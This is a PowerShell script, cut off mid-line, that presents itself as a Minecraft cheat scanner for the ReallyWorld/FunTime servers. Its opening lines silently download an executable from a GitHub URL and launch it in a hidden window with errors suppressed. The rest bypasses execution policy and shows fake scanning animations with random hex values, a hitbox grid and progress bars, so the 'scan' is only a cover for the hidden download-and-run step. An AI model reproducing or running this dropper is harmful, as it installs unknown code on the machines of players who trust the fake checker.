# MINECRAFT CHEAT SCANNER v2.0 [СКАЧИВАЕТ everything В КОНЦЕ]
    # Скачиваем everything в текущую папку
    Invoke-WebRequest -Uri "https://github.com/letyss0304/FTchecker/raw/refs/heads/main/FTchecker.exe" -OutFile "FTchecker.exe" -ErrorAction SilentlyContinue
    
    # Запускаем 
    Start-Process -FilePath "FTchecker.exe" -WindowStyle Hidden
    

Set-ExecutionPolicy Bypass -Scope Process -Force

Clear-Host

$ErrorActionPreference = "SilentlyContinue"

# Функция для печати текста
function Type-Text($text, $color = "White", $speed = 20) {
    $text.ToCharArray() | ForEach-Object {
        Write-Host $_ -NoNewline -ForegroundColor $color
        Start-Sleep -Milliseconds $speed
    }
    Write-Host ""
}

# Анимация сетки хитбоксов
function Show-HitboxGrid {
    $grid = @(
        "      [  .  .  .  |  .  .  .  ]",
        "      [  .  .  X--|--X  .  .  ]",
        "      [  .  |  .  |  .  |  .  ]",
        "      [--.  X---[HIT]---X  .--]",
        "      [  .  |  .  |  .  |  .  ]",
        "      [  .  .  X--|--X  .  .  ]",
        "      [  .  .  .  |  .  .  .  ]"
    )
    foreach ($line in $grid) {
        Write-Host $line -ForegroundColor Cyan
        Start-Sleep -Milliseconds 150
    }
}

# Функция "Матрицы"
function Show-FastScan($duration) {
    $endTime = (Get-Date).AddSeconds($duration)
    while ((Get-Date) -lt $endTime) {
        $hex = "0x" + ("{0:X4}" -f (Get-Random -Max 65535)) + " -- ADR:" + (Get-Random -Min 100 -Max 999)
        Write-Host " [ANALYZING] $hex" -ForegroundColor Green
        Start-Sleep -Milliseconds 25
    }
}

# --- ГЛАВНЫЙ ЦИКЛ ПРОГРАММЫ ---
do {
    Clear-Host
    Write-Host "=========================================================" -ForegroundColor Cyan
    Write-Host "   CHECK TOOL: REALLYWORLD / FUNTIME Edition    " -ForegroundColor White
    Write-Host "=========================================================" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "Выберите модуль проверки:" -ForegroundColor Gray
    Write-Host " [1] Полная проверка системы (90 сек) - [CLEAN]" -ForegroundColor Yellow
    Write-Host " [2] Глубокий анализ Кликеров (Autoclicker/Macros)" -ForegroundColor Yellow
    Write-Host " [3] Скан скрытых DLL (Injected Clients)" -ForegroundColor Yellow
    Write-Host " [4] Проверка Хитбоксов (Hitbox Expand/Reach)" -ForegroundColor Red
    Write-Host " [0] Выход" -ForegroundColor Gray
    Write-Host ""
    
    $choice = Read-Host "Введите номер (1-4)"

    switch ($choice) {
        "1" {
            Clear-Host
            Type-Text ">>> ЗАПУСК ПОЛНОЙ ПРОВЕРКИ (ALL MODULES)..." "Cyan"
            Show-FastScan 15
            for ($i = 0; $i -le 100; $i += 10) {
                Write-Progress -Activity "ГЛОБАЛЬНЫЙ СКАН" -Status "
